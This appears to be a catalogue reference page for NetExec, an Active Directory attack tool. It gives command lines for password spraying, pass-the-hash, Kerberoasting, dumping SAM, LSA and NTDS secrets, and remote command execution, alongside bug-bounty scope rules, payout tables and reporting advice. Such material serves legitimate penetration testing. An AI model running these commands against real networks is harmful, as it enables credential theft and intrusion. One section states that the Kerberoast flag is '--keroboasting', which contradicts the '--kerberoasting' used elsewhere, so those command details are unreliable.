---
name: "netexec"
categories:
  - blackarch-scanner
version: "v1.5.1.r914.g4702580"
homepage: "https://netexec.wiki/"
packaged-by: [blackarch, kali, aur, nixpkgs]
blackarch-builddate: "2026-09-28"
build-system: python
license: BSD
meta-checked: "2026-11-09"
github-repo: "Pennyw0rth/NetExec"
github-stars: 5979
github-pushed: "2026-11-06"
github-archived: false
github-issues: 169
github-match: "search"
gh-checked: "2026-11-07"
worth: 8.8
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
last-refresh: "2026-11-19"
github-commits-year: 1470
gh-activity-checked: "2026-11-09"
---

# netexec

> The maintained CrackMapExec lineage: one `netexec <protocol> <targets> -u -p` command validates credentials, enumerates, and dumps secrets across SMB, WinRM, LDAP, MSSQL, WMI, RDP, SSH and more.

## What it's for

NetExec (binaries `netexec` and `nxc`) is the community-maintained successor to the archived CrackMapExec — same author community, same command grammar, actively developed with per-protocol documentation at its wiki. You pick a protocol, hand it targets plus usernames, passwords, NTLM hashes or Kerberos tickets, and it reports per-host authentication results — a valid administrative login prints the status marker `(Pwn3d!)` — while flags layer enumeration, credential dumping and command execution on top of whatever authenticates. It is the standard first move after obtaining any Active Directory credential: validate it, spray with it, enumerate shares and users with it, then dump gMSA passwords or run modules like `maq` and `daclread` over LDAP. Kerberos is a first-class authentication mode (`-k`, `--use-kcache`), and the same CLI reaches segments only accessible through a SOCKS pivot by wrapping the call in `proxychains`. Beyond the patterns below it also executes commands with selectable methods (`-x`/`-X`, `--exec-method wmiexec|smbexec|atexec|mmcexec`), dumps local secrets (`--sam`, `--lsa`, `--ntds`), authenticates with LAPS passwords (`--laps`), collects BloodHound ingest zips over LDAP (`--bloodhound -c All`), and ships dozens of protocol modules (`-L` lists them, including `ms17-010`, `coerce_plus` and `timeroast`); for the pre-fork interface see the [[crackmapexec]] note. What it does not do: it is not a network vulnerability scanner in the nmap sense — every non-module action rides on a valid authentication.

## Typical use cases

### Validate a credential pair over SMB

the fastest check of whether a leaked or guessed user/password pair works against a host.

```
netexec smb 198.51.100.10 -u user -p 'Password1' -d example.com
```

Outcome: one status line per host showing protocol, IP, port, hostname and the authentication verdict — `[+] example.com\user:Password1 (Pwn3d!)` on success, the failure reason (status code, or `ntlm:false` when the host refuses NTLM) otherwise. A bare `netexec smb 198.51.100.10 -u 'guest' -p ''` tests null/guest sessions and prints the domain, DC flag and signing state even without credentials.

### Spray a password across user lists

test one or many passwords against a whole username list in a single run.

```
netexec smb target.example.com -u users.txt -p 'Password1' --continue-on-success
netexec smb target.example.com -u users.txt -p passwords.txt --no-bruteforce
```

Outcome: every username is tried with the password(s); by default the run stops at the first valid login, `--continue-on-success` keeps going to map every hit, and `--no-bruteforce` pairs line N of the user file with line N of the password file instead of crossing them. Any protocol works the same way — swap `smb` for `winrm`, `ldap` or `mssql` to spray other services.

### Enumerate shares and access rights

see which SMB shares the authenticated account can read or write.

```
netexec smb target.example.com -u user -p 'Password1' --shares
netexec smb target.example.com -u 'guest' -p '' --shares read
```

Outcome: a table of the host's shares with READ/WRITE/ACCESS columns for that identity; appending `read`, `write` or `read,write` filters the listing to shares granting that access. Guest/null sessions often enumerate shares on misconfigured hosts before any credential exists.

### Enumerate domain users

pull the domain's user list with or without listing rights.

```
netexec smb dc01.example.com -u user -p 'Password1' --users
netexec smb target.example.com -u user -p 'Password1' --rid-brute 10000
```

Outcome: `--users` queries the domain user list directly when run against a domain controller with a listing-capable account; `--rid-brute` instead walks RID values (default 4000, raise the ceiling for large domains) and reconstructs usernames from SID responses, working when listing rights are missing. Pipe through `grep`/`cut` to produce clean username files for spraying.

### Pass the hash

authenticate with a captured NTLM hash instead of a password.

```
netexec smb target.example.com -u Administrator -H 1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d
netexec ldap dc01.example.com -u user -H 1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d
```

Outcome: `-H`/`--hash` (defined on every protocol — smb, ldap, winrm, mssql, wmi, rdp) takes a bare NT hash, an `LM:NT` pair, or a file of hashes; success prints `(Pwn3d!)` and the hash can then drive any enumeration flag or module exactly like a password.

### Authenticate with Kerberos

use ticket-based authentication against domains where NTLM is disabled.

```
netexec smb dc01.example.com -u user -p 'Password1' -k -d example.com
netexec ldap dc01.example.com --use-kcache -M maq
```

Outcome: `-k`/`--kerberos` requests and uses Kerberos tickets (hostnames must resolve — add the target to the hosts file or pass `--dns-server`); `--use-kcache` instead authenticates from an existing ccache ticket set in `KRB5CCNAME`, e.g. one obtained with getTGT. The same flags work on every protocol, letting enumeration and modules run entirely over Kerberos.

### Check WinRM access and run a command

find which accounts reach a remote shell and use it.

```
netexec winrm target.example.com -u users.txt -p 'Password1' --continue-on-success
netexec winrm target.example.com -u user -p 'Password1' -x 'whoami'
```

Outcome: a `(Pwn3d!)` on the winrm protocol means the account can open a PowerShell remote session; `-x COMMAND` (or `-X` for PowerShell) executes a command on the target and prints its output inline. The parallel checks for other shells: `--exec-method atexec|smbexec|wmiexec` selects the execution mechanism when riding the smb protocol.

### Authenticate to MSSQL with a local account

validate database credentials that are local to the SQL server, not domain accounts.

```
netexec mssql target.example.com -u sa -p 'Password1' --local-auth
```

Outcome: `--local-auth` forces local (non-domain) authentication — necessary for `sa` and other local SQL logins — and prints the server banner and authentication verdict; the same flag exists on smb, winrm and ldap for machine-local accounts. From here `-x` runs operating-system commands when the login has `xp_cmdshell` rights.

### Dump gMSA passwords from a domain controller

retrieve the password of a group-managed service account.

```
netexec ldap dc01.example.com -u user -p 'Password1' --gmsa
```

Outcome: enumerates gMSA accounts and prints their computed password (NT hash), which can then be passed with `-H` to authenticate as the service account; `--gmsa-convert-id` and `--gmsa-decrypt-lsa` handle the offline variants from cached LSA data.

### Run protocol modules

execute the packaged enumeration and attack modules against authenticated targets.

```
netexec ldap dc01.example.com -u user -p 'Password1' -M maq
netexec ldap dc01.example.com -u user -p 'Password1' -M daclread -o TARGET=user
netexec smb target.example.com -u user -p 'Password1' -L
```

Outcome: `-M <name>` runs a module across the target set — `maq` prints the domain's MachineAccountQuota, `daclread` reads DACLs of a target object (options via `-o KEY=VALUE`, e.g. `TARGET`/`TARGET_DN`/`PRINCIPAL`), `adcs` maps certificate templates, `coerce_plus` forces authentication callbacks to a listener, `ms17-010` checks for the EternalBlue family. `-L` lists all modules for the protocol and `--options` prints one module's parameters. Note the module list lives in the NetExec tree, not the archived CrackMapExec.

### Spider shares and download interesting files

walk share trees for filenames worth reading, optionally pulling files back.

```
netexec smb target.example.com -u user -p 'Password1' --spider SHARE
netexec smb target.example.com -u user -p 'Password1' -M spider_plus -o download_flag=true
```

Outcome: `--spider SHARE` lists files on one share; the `spider_plus` module recursively catalogs every accessible share into a JSON file under the nxc output directory (`~/.nxc/nxc_spider_plus`), and `download_flag=true` additionally downloads each file up to `MAX_FILE_SIZE` (default 51200 bytes) — the quickest way to sweep a found credential's readable files for config and password leaks.

### Pivot through a SOCKS proxy

run all of the above against hosts reachable only through an implanted tunnel.

```
proxychains4 -q netexec smb 198.51.100.10 -u user -p 'Password1'
```

Outcome: the entire netexec surface (validation, spraying, modules) works unchanged through a SOCKS4/5 proxy from tools such as chisel or an SSH dynamic forward; `proxychains4 -q` silences the per-connection noise so the per-host result table stays readable. This is the standard pattern once a foothost inside a second segment provides a pivot.

### Run a raw LDAP query

```
netexec ldap dc01.example.com -u user -p 'Password1' --query "(sAMAccountName=Administrator)" "sAMAccountName pwdLastSet"
```

Outcome: passes an ldapsearch-style filter to the DC and prints the requested attributes unparsed — the second quoted argument is the attribute list, and an empty string (`""`) returns every attribute. A one-line alternative to ldapsearch inside the netexec credential context; `-H`, `-k` and `--use-kcache` all apply unchanged.

### Kerberoast service accounts over LDAP

```
netexec ldap dc01.example.com -u user -p 'Password1' --keroboasting svc-hashes.txt
```

Outcome: requests service tickets for every SPN-bearing account and appends the crackable etype-23 hashes to the named file (crack with hashcat mode 13100). The flag is `--keroboasting`; `--targeted-keroboast <user>` additionally sets a temporary SPN on named accounts that have none — with write rights over them — includes them in the roast, then removes the SPN again.

### Read the domain password policy

```
netexec smb dc01.example.com -u user -p 'Password1' --pass-pol
```

Outcome: prints the domain policy — minimum length, complexity flags, history, lockout threshold and duration — pulled from the DC. Read it before any spray: the lockout counter decides how many tries per account are safe, and the minimum length rules out whole wordlists before they are fired.

### Generate a hosts file and krb5.conf

```
netexec smb 198.51.100.0/24 -u user -p 'Password1' --generate-hosts-file hosts
netexec smb dc01.example.com -u user -p 'Password1' -k --generate-krb5-file krb5.conf
```

Outcome: the first command writes an `/etc/hosts`-style mapping (IP plus hostname per enumerated machine) to append to the local hosts file, and `--generate-krb5-file` writes a `krb5.conf` pointing Kerberos tooling at the domain's KDC — together they supply the name resolution `-k` authentication requires without hand-editing either file. `--dns-server <dc-ip>` is the alternative: have netexec itself resolve through the DC.

---

## Bug bounty workflow with netexec

**Read this before the recipes below.** NetExec is a *credentialed, post-authentication, Active-Directory-internal* tool. It validates logins, sprays passwords, dumps secrets and executes commands. None of that belongs in an ordinary web-application bug bounty program. It is in scope only when the program's rules of engagement explicitly cover an internal network or Active Directory estate — enterprise VDPs that ship you a VPN profile and a test-domain account, "assumed-breach" or internal-pentest-style programs, red-team engagements, and your own labs. On a public web target, firing `netexec smb` at corporate infrastructure you merely *found* is unauthorized access, full stop. Everything below assumes written permission naming the hosts, the domain, and the account you were issued.

The workflow is also asymmetric in blast radius in a way web tooling is not: **a careless spray locks out real employees** (a self-inflicted denial-of-service and an instant scope violation), and `--sam/--lsa/--ntds` plus `-x`/`-M` *modify hosts and exfiltrate credential material*. Treat the phases as a one-way ratchet of escalating authorization — do not advance a phase until the program's rules clearly cover it.

### Phase 0 — Authorization and scope gate

Before the first packet, pin down four things in writing and keep the email/scope page as evidence:

- **Which hosts/CIDRs** — map the program's in-scope ranges to a target file (TEST-NET placeholders here: `198.51.100.0/24`). Never let a `--generate-hosts-file` sweep or a `/24` spray spill one address outside it.
- **Which account(s)** you were issued, and whether you may create or use additional test accounts (needed for any cross-account check).
- **Spraying allowance** — are authentication attempts permitted at all? If yes, at what rate, and is account lockout acceptable? If the program is silent, assume *no spraying* and stick to single known-credential validation.
- **Collection allowance** — are `--sam`, `--lsa`, `--ntds`, command execution (`-x`/`-X`), and host-touching modules permitted? These are domain-modifying / data-exfiltrating actions and are enterprise-/red-team-only. On a VDP that is silent about them, they are out of scope.

If any of the four is unclear, the only phase you may run is Phase 1 (credential-free recon), and even that only inside confirmed ranges.

### Phase 1 — Credential-free recon (the safe surface)

Null and guest sessions are read-only, send no password, and cannot lock anything out — this is the one part of the netexec surface that is low-risk by default. It is also where the cheapest, most defensible findings live: anonymous exposure.

```bash
# host/domain/signing map across the authorized range — no credentials sent
netexec smb 198.51.100.0/24 -u '' -p '' --log phase1-null.log
# -> per host: name, domain, OS, "signing:False", "SMBv1:True" flags
```

The status line netexec prints for an unauthenticated SMB connection already contains three reportable facts: **SMB signing not required** (`signing:False` → NTLM relay exposure), **SMBv1 enabled** (`SMBv1:True`), and the host's domain/OS fingerprint. Then test what anonymous access actually reads:

```bash
netexec smb 198.51.100.0/24 -u '' -p '' --shares        # null-session readable shares
netexec smb dc01.example.com -u '' -p '' --users         # anonymous user enumeration
netexec smb dc01.example.com -u '' -p '' --pass-pol      # anonymous policy disclosure
netexec smb dc01.example.com -u 'guest' -p '' --shares   # guest-logon variant
```

Any share, user list, or password policy that returns to a null/guest session is "anonymous enumeration" — Low-to-Medium on its own, and a force-multiplier for every later phase (a leaked user list is your spray list; a readable share is your config-leak hunt). These probes are also your inventory: every host that answers is confirmed in-scope and alive. Capture the full console with `--log` as your evidence baseline.

### Phase 2 — Credentialed validation and disciplined spraying

Only if the program issued you credentials and/or permits authentication attempts. **Read the password policy first** — the lockout threshold is the number that keeps you from DoS-ing real users:

```bash
netexec smb dc01.example.com -u issued_user -p 'IssuedPass' --pass-pol
# -> Minimum password length, lockout threshold (e.g. 5), reset/observation window (e.g. 30 min)
```

Validate the issued credential before anything else, then — if and only if spraying is authorized — spray *below* the lockout threshold, one attempt per account per observation window, with jitter:

```bash
# one password, many users, spaced out; never exceed (threshold - 1) tries per window
netexec smb dc01.example.com -u users.txt -p 'Spring2026!' \
  --continue-on-success --jitter 3-8 -t 5 --log spray.log
```

`--continue-on-success` keeps the run going past the first hit so you map every reuse (default behaviour stops at the first valid login). `--jitter 3-8` inserts a random 3–8 s pause between authentication attempts (`--jitter N` fixed, `--jitter A-B` random, `--jitter A-A` constant). **Critical caveat: jitter and threads throttle per host, not per account** — lockout counters are per account across the whole domain, so spacing matters more than any single flag. With N domain controllers, one spray can register multiple failures against the same account. The safe pattern is one password across the user list, then *wait a full observation window* before the next password — do not loop passwords back-to-back.

**The lockout-safe spraying budget — do the arithmetic before you fire.** `--pass-pol` hands you the three numbers that bound a safe run: the lockout *threshold* T (bad attempts before lockout), the *observation window* W (minutes over which bad attempts accumulate), and the *lockout duration*. Your rule is simple: **never send more than T − 1 bad passwords to the same account within any window W**, and leave margin because other systems (Outlook, VPN, mapped drives) may already be contributing failed attempts you cannot see. A concrete read: `Account Lockout Threshold: 5`, `Reset Account Lockout Counter after: 30 minutes` means **at most 4 attempts per account per 30 minutes — and prudently 1–2 to leave headroom**. So:

- Spray **one** password across the whole user list in a single pass (one attempt per account), confirm the run finished, then *sleep the full window* (`sleep 1800`) before the next password. Three passwords safely tested across a day, not a brute force.
- If `Account Lockout Threshold: 0`, lockout is disabled — spraying will not lock accounts, but it is still noisy and still needs authorization; keep jitter on to stay under alerting thresholds.
- Watch every line for `STATUS_ACCOUNT_LOCKED_OUT`. One such line means you have already harmed a real account — **stop the run immediately**, note it, and tell the program. Do not "finish the list."

For a pivoted or lossy network, `--timeout` (max seconds per thread) and `--smb-timeout` (SMB connection timeout, default 2 s) keep stalled hosts from skewing the pace; raise them through `proxychains` rather than cranking `-t`, which only multiplies concurrent auth load.

### Phase 3 — Post-authentication enumeration (read-only, credentialed)

With a valid credential, enumerate without touching host state. These are read operations against LDAP/SMB and are the backbone of an AD finding set:

```bash
netexec smb dc01.example.com -u user -p 'Pass' --users --groups     # directory inventory
netexec smb target.example.com -u user -p 'Pass' --shares           # what this identity reads/writes
netexec smb dc01.example.com -u user -p 'Pass' --rid-brute 10000    # when --users is blocked
netexec ldap dc01.example.com -u user -p 'Pass' --bloodhound --collection All  # graph the estate
netexec ldap dc01.example.com -u user -p 'Pass' --gmsa              # readable gMSA passwords
netexec smb target.example.com -u user -p 'Pass' --laps            # readable LAPS passwords
```

A low-privilege account that can read a gMSA password, a LAPS local-admin password, or a writable share holding credentials is a privilege-escalation finding in its own right. BloodHound ingest (`--collection All`) is read-only but *voluminous* — it is heavy LDAP traffic and produces a full map of the directory; confirm the program tolerates the query volume, and treat the resulting zip as sensitive data you must store and dispose of per the rules.

### Phase 4 — Offline-attack harvesting (request tickets, crack off the clock)

Kerberoasting and AS-REP roasting *request* tickets/hashes over the wire, then crack them **offline** on your own hardware — no online guessing against the domain, so no lockout risk. This is often the highest-value, lowest-collateral AD finding path:

```bash
netexec ldap dc01.example.com -u user -p 'Pass' --kerberoasting kroast.txt
netexec ldap dc01.example.com -u user -p '' --asreproast asrep.txt
# crack locally, never against the DC:
hashcat -m 13100 kroast.txt wordlist.txt     # TGS-REP etype 23 (Kerberoast)
hashcat -m 18200 asrep.txt wordlist.txt      # AS-REP etype 23 (AS-REP roast)
```

The finding is a *service account with a crackable password* (Kerberoast) or a *user with pre-authentication disabled* (AS-REP roastable). Report the account name, the fact that a ticket/hash was obtainable with your privilege level, and — only if cracking succeeds — the strength class of the password (not necessarily the plaintext; redact per program rules). `--targeted-kerberoast <name>` additionally sets a temporary SPN on a victim you have write access over, roasts it, and removes the SPN — that *writes to the directory*, so it belongs under the Phase 5 authorization bar, not here.

### Phase 5 — High-impact collection and execution (enterprise/red-team only)

`--sam`, `--lsa`, `--ntds`, command execution, and host-touching modules change state on the target and/or exfiltrate credential material. Do not run them unless the engagement explicitly authorizes them in writing:

```bash
netexec smb target.example.com -u admin -p 'Pass' --sam               # local SAM hashes (needs local admin)
netexec smb target.example.com -u admin -p 'Pass' --lsa               # LSA secrets / cached creds
netexec smb dc01.example.com   -u da -p 'Pass' --ntds --user krbtgt   # scope the dump to one account
netexec smb target.example.com -u admin -p 'Pass' -x 'whoami'         # command execution
```

Where the engagement wants proof of access without mass credential theft, **scope the dump**: `--ntds --user Administrator` pulls a single account rather than the entire directory, which is the proportionate PoC for "I could DCSync." Prefer the narrowest action that proves the impact, and record exactly what you touched for the cleanup section of the report.

---

## Where the money is with netexec

Ordered by payout-per-collateral on an AD-scoped program. "Dupe risk" is how likely the finding is already in the program's queue.

| Finding class | How netexec reaches it | Typical severity | Dupe risk |
|---|---|---|---|
| Weak/reused/default credential (spray hit) | `smb -u users.txt -p pass --continue-on-success` | High–Critical | Low–Med |
| Kerberoastable account, crackable password | `ldap --kerberoasting` → `hashcat -m 13100` | High–Critical | Low |
| AS-REP roastable account, crackable password | `ldap --asreproast` → `hashcat -m 18200` | High | Low |
| Low-priv-readable gMSA / LAPS password | `ldap --gmsa`, `smb --laps` | High–Critical | Low |
| Credentials/secrets in a readable share | `smb --shares`, `--spider`, `-M spider_plus` | Med–High | Med |
| ADCS misconfig (ESC templates) | `ldap -M adcs`, `-M ldap-checker` | High–Critical | Low |
| MS17-010 / EternalBlue exposure | `smb -M ms17-010` (detect only) | Critical | Low |
| Null/guest share or user/data exposure | `smb -u '' -p '' --shares/--users` | Low–Med | Med–High |
| SMB signing not required | Phase-1 status line (`signing:False`) | Low–Med | High |
| SMBv1 enabled | Phase-1 status line (`SMBv1:True`) | Low | High |
| MachineAccountQuota > 0 | `ldap -M maq` | Low–Med | Med |
| Excessive DACL / delegation rights | `ldap -M daclread`, BloodHound graph | High | Low |

Two rules of thumb: **cracked-password findings (spray, Kerberoast, AS-REP) are where the real money is and carry the least dupe risk**, because they depend on *this* estate's password hygiene; **SMB signing / SMBv1 / null-session findings are cheap but heavily duped** — report them, but lead with the credentialed findings. For MS17-010 and any exploit-grade module, *detect and report* — do not launch the exploit on a production host; it is a known crasher.

---

## Command recipes

Annotated command → expected output, with the low-volume settings called out. Every flag below is from `nxc <protocol> --help` on current NetExec.

**Credential-free host and signing sweep (safe, no auth sent).**
```bash
netexec smb 198.51.100.0/24 -u '' -p '' --log recon.log
```
Expected: one line per live host — `SMB  198.51.100.10  445  HOST01  [*] Windows ... (name:HOST01) (domain:example.com) (signing:False) (SMBv1:False)`. `signing:False` and `SMBv1:True` are reportable immediately. `--log recon.log` captures the console to a file (there is **no** `--json`/`--grepable`/`--markdown` output mode — see Pitfalls).

**Validate one issued credential before anything else.**
```bash
netexec smb target.example.com -u issued_user -p 'IssuedPass' -d example.com
```
Expected: `[+] example.com\issued_user:IssuedPass` (a plain `[+]`), or `[+] ... (Pwn3d!)` if the account is local admin, or `[-] ...` with a failure reason (`STATUS_LOGON_FAILURE`, or `STATUS_ACCOUNT_LOCKED_OUT` — stop at once if you see the latter).

**Read the policy, then spray under the lockout threshold.**
```bash
netexec smb dc01.example.com -u user -p 'Pass' --pass-pol            # read first
netexec smb dc01.example.com -u users.txt -p 'Spring2026!' \
  --continue-on-success --jitter 5-10 -t 3 --log spray.log          # then spray, slowly
```
Expected from `--pass-pol`: `Minimum password length: 8`, `Account Lockout Threshold: 5`, `Reset Account Lockout Counter: 30 minutes`. Keep tries per account per window to `threshold - 1` or fewer. `-t 3` caps concurrency; `--jitter 5-10` spaces attempts 5–10 s apart. Spray *one* password across the list, then wait a full reset window before the next.

**Line-by-line credential pairing (not a cross-product).**
```bash
netexec smb target.example.com -u users.txt -p passwords.txt --no-bruteforce
```
Expected: user line N is tried only with password line N — use this to replay a dumped `user:pass` list without multiplying attempts into a lockout storm. Omitting `--no-bruteforce` crosses every user with every password.

**Enumerate what an identity can read.**
```bash
netexec smb target.example.com -u user -p 'Pass' --shares
```
Expected: a table of shares with `READ`/`WRITE` columns for that identity. Append a filter — `--shares read` or `--shares write` — to narrow the listing.

**Offline-crackable material (no online guessing).**
```bash
netexec ldap dc01.example.com -u user -p 'Pass' --kerberoasting kroast.txt
netexec ldap dc01.example.com -u user -p '' --asreproast asrep.txt
```
Expected: crackable hashes appended to the named files (`$krb5tgs$23$...` and `$krb5asrep$23$...`). Crack with `hashcat -m 13100` / `-m 18200` on your own box — never point a cracking run at the DC.

**BloodHound ingest (read-only but heavy).**
```bash
netexec ldap dc01.example.com -u user -p 'Pass' --bloodhound --collection All
```
Expected: a BloodHound-ingestible zip. `--collection All` is the broadest sweep; narrow it (e.g. `--collection Group,ACL`) if the program flags the LDAP volume. NetExec's built-in collector defaults to the Community-Edition ingestor.

**Kerberos-only auth where NTLM is disabled.**
```bash
netexec smb dc01.example.com -u user -p 'Pass' -k --generate-krb5-file krb5.conf
netexec ldap dc01.example.com --use-kcache -M maq
```
Expected: `-k` uses Kerberos (names must resolve — pair with `--generate-krb5-file`/`--generate-hosts-file` or `--dns-server`); `--use-kcache` reuses a ccache from `KRB5CCNAME`.

**Collection lines — enterprise/red-team authorization only.**
```bash
netexec smb target.example.com -u admin -p 'Pass' --sam          # [{secdump,regdump}] method optional
netexec smb target.example.com -u admin -p 'Pass' --lsa
netexec smb dc01.example.com   -u da -p 'Pass' --ntds --user Administrator   # scope the dump
```
Expected: `--sam` prints local account hashes, `--lsa` prints LSA secrets/cached creds, `--ntds` dumps the directory (default method `drsuapi`; `--ntds vss` uses Volume Shadow Copy). `--ntds --user <name>` limits the dump to one principal — the proportionate PoC. These modify hosts and exfiltrate secrets; do not run them on a program that has not authorized them in writing.

**Command execution and its methods (authorized engagements only).**
```bash
netexec smb target.example.com -u admin -p 'Pass' -x 'whoami /groups'      # cmd
netexec smb target.example.com -u admin -p 'Pass' -X '$PSVersionTable'      # PowerShell
netexec smb target.example.com -u admin -p 'Pass' --exec-method atexec -x 'whoami'
```
Expected: the command's stdout inline under the host line. `--exec-method` selects the mechanism (`wmiexec`, `smbexec`, `atexec`, `mmcexec`) — reach for an alternative when the default errors or is blocked; each leaves a different host-side artifact (service creation, scheduled task, WMI call), which matters for both detection and your cleanup notes. `--continue-on-success` is incompatible with command execution.

**Modules: list, inspect, run.**
```bash
netexec ldap dc01.example.com -u user -p 'Pass' -L                          # list ldap modules
netexec ldap dc01.example.com -u user -p 'Pass' -M daclread --options       # one module's params
netexec ldap dc01.example.com -u user -p 'Pass' -M daclread -o TARGET=user ACTION=read
netexec smb  target.example.com -u user -p 'Pass' -M spider_plus -o download_flag=true
netexec smb  198.51.100.0/24    -u '' -p '' -M ms17-010                     # detect only
```
Expected: `-L` prints the protocol's module list; `--options` (or `-o` with no value) prints a module's parameters; `-o KEY=VALUE` passes them. `-M spider_plus` catalogs every readable share to JSON under `~/.nxc/` and, with `download_flag=true`, pulls files up to `MAX_FILE_SIZE` (default 51200 bytes) — a fast config-leak sweep, but it *writes files to your disk from the target*, so treat the haul as sensitive. `-M ms17-010` is a safe *detector*; do not pair it with an exploit module on production.

**Reusing validated credentials from the local database.**
```bash
netexec smb target.example.com -u user -p 'Pass'      # a valid result is stored automatically
netexec smb target.example.com -id 1                  # replay stored credential #1 by id
```
Expected: NetExec records successful credentials in its local database; `-id <n>` replays one (or several) without re-typing them — handy for chaining protocols, and it keeps you from re-sending passwords you have already proven, which trims needless authentication noise.

---

## Flag blast-radius classification

The single most useful lens for staying in scope is *what a flag does to the target*, not what it tells you. Group every netexec action into three tiers and let the program's authorization decide how far down the table you may go:

| Tier | Blast radius | Representative flags | Authorization needed |
|---|---|---|---|
| **Safe recon** | Reads only; sends no password; cannot lock out or modify | `-u '' -p ''`, `--shares` (null), `--users`, `--pass-pol`, `signing`/`SMBv1` status, `-M ms17-010` (detect) | In-scope range confirmed |
| **Authentication** | Sends credentials; *can lock out accounts* | `-u/-p/-H` validation, spraying (`--continue-on-success`, `--no-bruteforce`), `--kerberoasting`, `--asreproast` (wire request; crack offline) | Spraying/auth explicitly permitted + `--pass-pol` read |
| **State-changing / exfil** | Writes to hosts or steals credential material | `--sam`, `--lsa`, `--ntds`, `-x`/`-X`, `--targeted-kerberoast` (sets SPN), `-M spider_plus download`, relay via `coerce_plus` | Enterprise/red-team engagement authorizing these in writing |

Kerberoast and AS-REP roast sit in the authentication tier (they *request* tickets, no online guessing) but their cracking is entirely offline and off-target — that is exactly why they are the high-value, low-collateral path. Anything in the bottom tier is where a bug bounty account gets banned if the rules did not cover it.

---

## Pitfalls, noise and scope discipline

- **Account lockout = self-inflicted DoS = instant scope violation.** This is the number-one way to get a bug bounty account banned with this tool. Always `--pass-pol` first; stay below the lockout threshold per account per observation window; remember `--jitter` and `-t` throttle *per host*, not per account, so with multiple DCs a single spray can rack up failures against one account faster than you expect.
- **Running netexec on a web-app-scoped program is unauthorized access.** The tool only belongs on programs whose rules explicitly cover internal/AD scope. Finding a corporate SMB port during web recon does not put it in scope.
- **`--sam`, `--lsa`, `--ntds`, `-x`/`-X`, and host-touching modules change state and exfiltrate secrets.** They are domain-modifying / data-exfiltration actions — enterprise and red-team engagements only. A silent VDP has not authorized them. When they are authorized, scope them (`--ntds --user`) and prove impact with the minimum action.
- **`ms17-010` and other exploit modules crash hosts.** Use them to *detect*, not to exploit, on anything resembling production.
- **BloodHound `--collection All` is loud.** It is a large LDAP burst; some programs rate-limit or alert on it. Narrow the collection methods, or confirm the volume is acceptable, and handle the ingest zip as sensitive data.
- **`--generate-hosts-file` / CIDR targets can spill out of scope.** Point netexec at a vetted target file of in-scope addresses; never a broad `/16` that might include adjacent tenants.
- **There is no machine-readable output mode.** `--json`, `--grepable`, and `--markdown` do **not** exist (a structured-output request, issue #280, was closed as not planned). `--log LOG` writes the human console to a file; parse that or capture the terminal. Do not claim a `--markdown` flag in a report — it will read as fabricated.
- **Clean up after yourself.** Remove any test accounts you created, note (and reverse) any temporary SPNs from `--targeted-kerberoast`, and never retain dumped credential material beyond what the PoC needs.
- **Credentials with special characters / leading dashes.** Single-quote passwords with shell metacharacters; for a value that begins with `-`, use the long form with `=` (`-u='-user' -p='-Pass'`) or netexec treats it as a flag.

---

## Reporting evidence

NetExec's console *is* the evidence — capture it verbatim. For every finding include:

- **The exact command and the exact console line**, including the status marker. `[+] example.com\user:Pass (Pwn3d!)` on `smb` proves local-admin; a plain `[+]` proves a valid login; `signing:False` proves the signing posture. Redact the real password to its strength class where the program requires it.
- **The `--log` file** (`--log finding.log`) as an attachment — it timestamps the run and preserves the full per-host table that a single pasted line omits.
- **Preconditions**: the privilege level of the account you used (issued low-priv user, anonymous/null, or admin), so the triager can judge impact. "A *low-privilege* domain user can read this gMSA password" is the sentence that sets severity.
- **For cracked material** (Kerberoast/AS-REP): the netexec line that obtained the hash, the hashcat mode used, and the *result class* (cracked with rockyou in N seconds → weak) — not necessarily the plaintext, and never more cracked credentials than the PoC needs.
- **For collection actions** (`--sam`/`--lsa`/`--ntds`): record precisely what was dumped and confirm you scoped it (`--ntds --user`), plus your disposal of the output. Triagers weigh proportionality; a single-account dump reads as responsible, a full `ntds.dit` exfil reads as reckless.
- **Scope proof**: keep the authorization email / scope page that put these hosts and this account in bounds — attach or reference it so the triager never has to wonder whether the test was sanctioned.
- **Remediation**, netexec-specific: enforce SMB signing and disable SMBv1 (Phase-1 findings); raise password complexity and set service-account passwords to 25+ random chars (Kerberoast); enable Kerberos pre-authentication (AS-REP); restrict gMSA/LAPS read ACLs; disable null sessions (`RestrictAnonymous`).

---

## Choosing the protocol

NetExec speaks one grammar across many protocols (`smb`, `winrm`, `ldap`, `mssql`, `wmi`, `rdp`, `ssh`, `ftp`, `vnc` and more). The same credential tested across protocols answers *different* questions, so run the ones the engagement cares about rather than only `smb`:

| Protocol | What a `(Pwn3d!)` / `[+]` means | Reach for it when |
|---|---|---|
| `smb` | Valid login; `(Pwn3d!)` = local admin (secrets dump + exec available) | First move on any AD host; signing/SMBv1/share recon |
| `ldap` | Valid directory bind | Kerberoast, AS-REP roast, gMSA, BloodHound, raw `--query`, modules like `maq`/`daclread`/`adcs` |
| `winrm` | `(Pwn3d!)` = remote PowerShell session | Confirming which accounts get an interactive shell; `-x`/`-X` execution |
| `mssql` | Valid SQL login; `--local-auth` for `sa`/local logins | Database-scoped targets; `-x` via `xp_cmdshell` when the login allows it |
| `ssh` | Valid SSH login | Linux hosts inside an AD-adjacent estate |
| `wmi`/`rdp` | Valid auth over that service | Confirming lateral-movement surface a credential unlocks |

The discipline point: the *same* `signing:False` or spray result on `smb` does not tell you whether the account also opens a WinRM shell or binds LDAP. Re-test the credential on the protocols that map to the program's impact story, and keep each protocol's output in its own `--log` file for the report.

## Pairing netexec with enum4linux-ng, smbmap and relay tooling

NetExec is the fast per-host verdict engine; it pairs with deeper single-purpose tools, and the tool angle for an AD-scoped program expects you to know the handoffs.

- **enum4linux-ng** — where netexec's `-u '' -p '' --users/--shares/--pass-pol` gives you the quick anonymous verdict, `enum4linux-ng` does the exhaustive null/guest sweep (RID cycling, OS and domain info, group membership, printer/LSA detail) in one pass and emits structured JSON/YAML. Use netexec to find *which* hosts answer anonymously across the range, then point enum4linux-ng at the interesting one for the full writeup.
- **smbmap** — overlaps netexec's `--shares` and `--spider`, but is purpose-built for walking share trees, showing per-share permissions, and reading/downloading individual files with a path argument. When netexec flags a readable share worth exploring, smbmap is the cleaner tool for the file-level evidence; keep the download footprint minimal and only pull what the PoC needs.
